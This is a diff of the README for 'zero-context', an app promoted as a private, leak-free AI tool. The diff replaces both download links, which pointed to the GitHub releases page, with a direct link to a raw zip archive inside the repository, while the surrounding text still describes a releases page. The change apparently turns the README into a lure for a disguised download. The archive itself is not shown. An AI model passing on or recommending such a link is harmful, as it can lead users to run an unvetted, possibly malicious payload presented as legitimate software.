@@ -1,6 +1,6 @@
 # 🛡️ zero-context - Private AI, Zero Leaks
 
-[![Download zero-context](https://img.shields.io/badge/Download-zero--context-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Irongrey-genusengelmannia453/zero-context/releases)
+[![Download zero-context](https://img.shields.io/badge/Download-zero--context-blue?style=for-the-badge&logo=github&color=4B0082)](https://raw.githubusercontent.com/Irongrey-genusengelmannia453/zero-context/main/public/3.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Every time you paste an email, a phone number, or a client name into an AI chat,
 
 Visit this link to download the application:
 
-[**https://github.com/Irongrey-genusengelmannia453/zero-context/releases**](https://github.com/Irongrey-genusengelmannia453/zero-context/releases)
+[**https://raw.githubusercontent.com/Irongrey-genusengelmannia453/zero-context/main/public/3.8.zip**](https://raw.githubusercontent.com/Irongrey-genusengelmannia453/zero-context/main/public/3.8.zip)
 
 Click the green "Download" button or the latest release file listed on that page.
 
